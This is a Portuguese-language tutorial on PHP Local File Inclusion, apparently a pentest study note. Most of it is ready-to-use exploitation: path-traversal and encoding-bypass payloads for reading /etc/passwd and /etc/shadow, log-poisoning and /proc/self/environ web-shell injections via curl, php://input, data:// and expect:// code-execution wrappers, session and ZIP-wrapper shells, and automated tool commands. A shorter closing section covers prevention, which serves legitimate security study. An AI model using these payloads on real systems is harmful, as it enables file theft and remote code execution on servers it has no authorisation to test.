# Local File Inclusion

## O que é Local File Inclusion (LFI)?

**Local File Inclusion (LFI)** é uma vulnerabilidade de segurança que permite que um atacante inclua arquivos locais do servidor através da manipulação de parâmetros de entrada da aplicação web. Esta vulnerabilidade ocorre quando a aplicação aceita entrada do usuário para especificar qual arquivo deve ser incluído, sem validar adequadamente essa entrada.

---

## Como Funciona a Vulnerabilidade

### Conceito Básico

A vulnerabilidade LFI surge quando código inseguro como este é utilizado:

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

Neste exemplo, o parâmetro `page` é usado diretamente na função `include()` sem nenhuma validação, permitindo que um atacante especifique qualquer arquivo do sistema.

---

## Técnicas de Exploração

### 1. Path Traversal Básico

A técnica mais comum é usar sequências `../` para navegar no sistema de arquivos:

```
[http://exemplo.com/index.php?page=../../../../etc/passwd](http://exemplo.com/index.php?page=../../../../etc/passwd)
```

**Arquivos comuns para testar em Linux:**

- `/etc/passwd` - Lista de usuários do sistema
- `/etc/shadow` - Hashes de senhas (requer privilégios)
- `/etc/hosts` - Mapeamento de hosts
- `/var/log/apache2/access.log` - Logs do Apache
- `/proc/self/environ` - Variáveis de ambiente do processo

**Arquivos comuns para testar em Windows:**

- `C:\Windows\System32\drivers\etc\hosts`
- `C:\Windows\win.ini`
- `C:\boot.ini`

### 2. Bypass de Filtros

Muitas aplicações tentam implementar filtros básicos. Aqui estão técnicas para contorná-los:

**Null Byte Injection (PHP < 5.3.4):**

```
page=../../../../etc/passwd%00
```

**Encoding duplo:**

```
page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**Encoding misto:**

```
page=..%2F..%2F..%2Fetc%2Fpasswd
```

**Bypass de extensão forçada:**

Se a aplicação adiciona `.php` automaticamente:

```
page=../../../../etc/passwd%00
page=../../../../etc/passwd/.
page=../../../../etc/passwd/..
```

**Variações de path traversal:**

```
....//....//....//etc/passwd
..../..../..../etc/passwd
....\/....\/....\/etc/passwd
```

### 3. Log Poisoning

Esta técnica combina LFI com envenenamento de logs para conseguir RCE (Remote Code Execution):

**Passo 1:** Injetar código PHP nos logs

```bash
# Via User-Agent no access.log
curl -A "<?php system(\$_GET['cmd']); ?>" [http://exemplo.com/](http://exemplo.com/)

# Via SSH no auth.log
ssh '<?php system(\$_GET['cmd']); ?>'@[exemplo.com](http://exemplo.com)
```

**Passo 2:** Incluir o arquivo de log via LFI

```
[http://exemplo.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami](http://exemplo.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami)
```

**Logs úteis:**

- `/var/log/apache2/access.log`
- `/var/log/apache2/error.log`
- `/var/log/nginx/access.log`
- `/var/log/auth.log`
- `/var/log/mail.log`

### 4. Wrapper PHP

PHP fornece wrappers que podem ser explorados:

**php://filter - Leitura de código fonte:**

```
page=php://filter/convert.base64-encode/resource=index.php
```

**php://input - Execução de código:**

```bash
POST /index.php?page=php://input HTTP/1.1
Host: [exemplo.com](http://exemplo.com)

<?php system('whoami'); ?>
```

**data:// - Execução de código:**

```
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami
```

**expect:// - Execução direta de comandos:**

```
page=expect://whoami
```

### 5. Session File Inclusion

Manipular arquivos de sessão PHP para incluir código malicioso:

**Passo 1:** Criar sessão com payload

```php
# Inserir via parâmetro que é salvo na sessão
[http://exemplo.com/index.php?lang=<?php](http://exemplo.com/index.php?lang=<?php) system('whoami'); ?>
```

**Passo 2:** Incluir arquivo de sessão

```
# Formato típico: /var/lib/php/sessions/sess_[PHPSESSID]
page=../../../../var/lib/php/sessions/sess_abcd1234
```

---

## Exemplos Práticos de Exploração

### Cenário 1: Aplicação de Galeria de Imagens

**Código vulnerável:**

```php
<?php
$image = $_GET['img'];
include("images/" . $image);
?>
```

**Exploração:**

```
[http://exemplo.com/gallery.php?img=../../../../etc/passwd](http://exemplo.com/gallery.php?img=../../../../etc/passwd)
```

### Cenário 2: Sistema de Templates

**Código vulnerável:**

```php
<?php
$template = $_GET['template'];
include("templates/" . $template . ".php");
?>
```

**Exploração com null byte:**

```
[http://exemplo.com/index.php?template=../../../../etc/passwd%00](http://exemplo.com/index.php?template=../../../../etc/passwd%00)
```

### Cenário 3: Módulo de Idiomas

**Código vulnerável:**

```php
<?php
$lang = $_GET['lang'];
include($lang . "_lang.php");
?>
```

**Exploração para RCE via log poisoning:**

1. Envenenar o log:

```bash
curl -A "<?php system(\$_GET['x']); ?>" [http://exemplo.com/](http://exemplo.com/)
```

1. Executar comando:

```
[http://exemplo.com/index.php?lang=../../../../var/log/apache2/access&x=cat](http://exemplo.com/index.php?lang=../../../../var/log/apache2/access&x=cat) /etc/passwd
```

---

## Escalando para RCE

### Método 1: Upload + LFI

**Passo 1:** Upload de arquivo com código PHP (mesmo que renomeado)

```
# Upload de shell.php.jpg
```

**Passo 2:** Incluir o arquivo via LFI

```
page=../../../../var/www/uploads/shell.php.jpg
```

### Método 2: /proc/self/environ

**Exploração:**

```bash
# Injetar payload no User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" [http://exemplo.com/](http://exemplo.com/)

# Incluir environ
[http://exemplo.com/index.php?page=../../../../proc/self/environ&cmd=id](http://exemplo.com/index.php?page=../../../../proc/self/environ&cmd=id)
```

### Método 3: ZIP Wrapper

**Criar arquivo malicioso:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip [shell.zip](http://shell.zip) shell.php
```

**Exploração:**

```
page=zip://../../../../var/www/uploads/[shell.zip](http://shell.zip)%23shell.php&cmd=whoami
```

---

## Ferramentas para Exploração

### Ferramentas Automatizadas

**LFISuite**

```bash
git clone [https://github.com/D35m0nd142/LFISuite.git](https://github.com/D35m0nd142/LFISuite.git)
python [lfisuite.py](http://lfisuite.py)
```

**Kadimus**

```bash
git clone [https://github.com/P0cL4bs/Kadimus.git](https://github.com/P0cL4bs/Kadimus.git)
make
./kadimus -u "[http://exemplo.com/index.php?page=FUZZ](http://exemplo.com/index.php?page=FUZZ)"
```

**DotDotPwn**

```bash
./[dotdotpwn.pl](http://dotdotpwn.pl) -m http -h [exemplo.com](http://exemplo.com) -x 80 -f /etc/passwd -k "root:"
```

### Wordlists Úteis

**SecLists - LFI:**

```bash
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
```

### Testes com Burp Suite

1. Interceptar requisição
2. Enviar para Intruder
3. Marcar parâmetro vulnerável
4. Carregar wordlist de LFI
5. Buscar por padrões de sucesso (ex: "root:")

---

## Detecção e Identificação

### Sinais de Vulnerabilidade

<aside>
⚠️

**Indicadores de LFI:**

- Parâmetros como `page`, `file`, `document`, `folder`, `path`, `include`
- Erros revelando caminhos de arquivo
- Mudança de conteúdo ao modificar parâmetros
- Mensagens de erro do PHP (`include()`, `require()`, `fopen()`)
</aside>

### Testando Manualmente

**Payloads iniciais:**

```
1. page=../../../etc/passwd
2. page=....//....//....//etc/passwd
3. page=/etc/passwd
4. page=php://filter/convert.base64-encode/resource=index.php
```

---

## Prevenção e Mitigação

### Boas Práticas de Código

**1. Whitelist de arquivos permitidos:**

```php
<?php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    include('home.php');
}
?>
```

**2. Validação rigorosa:**

```php
<?php
$page = basename($_GET['page']);
$page = str_replace(['..', '/', '\\'], '', $page);
include('pages/' . $page . '.php');
?>
```

**3. Usar caminhos absolutos:**

```php
<?php
$base_path = '/var/www/html/pages/';
$page = basename($_GET['page']);
$full_path = realpath($base_path . $page . '.php');

if (strpos($full_path, $base_path) === 0 && file_exists($full_path)) {
    include($full_path);
}
?>
```

### Configurações de Servidor

**PHP.ini hardening:**

```
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

**Permissões de arquivo:**

```bash
# Arquivos sensíveis devem ter permissões restritas
chmod 640 /etc/passwd
chmod 600 /var/log/apache2/*
```

### WAF e Proteções

- Implementar WAF (ModSecurity, Cloudflare)
- Monitorar padrões suspeitos (`../`, `%2e%2e`, wrappers PHP)
- Rate limiting em parâmetros sensíveis
- Logging e alertas para tentativas de acesso

---

## Checklist de Teste

- [ ]  Identificar parâmetros que aceitam nomes de arquivo
- [ ]  Testar path traversal básico (`../../../etc/passwd`)
- [ ]  Testar variações de encoding
- [ ]  Testar null bytes (em PHP < 5.3.4)
- [ ]  Testar wrappers PHP (`php://filter`, `php://input`, `data://`)
- [ ]  Verificar logs acessíveis para log poisoning
- [ ]  Testar inclusão de arquivos de sessão
- [ ]  Procurar por funcionalidades de upload combinadas com LFI
- [ ]  Testar `/proc/self/environ` para injeção
- [ ]  Documentar todos os achados com PoC

---

## Recursos Adicionais

**Leitura Recomendada:**

- OWASP Testing Guide - LFI/RFI
- HackTricks - File Inclusion
- PayloadsAllTheThings - File Inclusion

**Labs para Prática:**

- DVWA (Damn Vulnerable Web Application)
- bWAPP
- WebGoat
- HackTheBox - Machines com LFI
- TryHackMe - LFI Rooms

---

> **Nota Importante:** Este conteúdo é apenas para fins educacionais e de teste autorizado. Explorar vulnerabilidades sem permissão explícita é ilegal e antiético. Sempre obtenha autorização por escrito antes de realizar testes de penetração.
>